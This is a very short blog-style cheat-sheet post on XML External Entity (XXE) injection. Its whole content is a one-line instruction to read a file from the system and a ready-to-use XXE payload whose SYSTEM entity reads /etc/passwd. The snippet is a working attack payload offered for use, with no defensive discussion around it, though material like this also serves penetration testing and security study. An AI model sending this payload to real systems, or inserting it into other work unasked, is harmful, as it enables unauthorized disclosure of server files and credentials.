---
layout: post
title: "xxe"
keywords: "xxe, xml external entity"
---
#### SYSTEM
Use XXE to read some file from the system

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```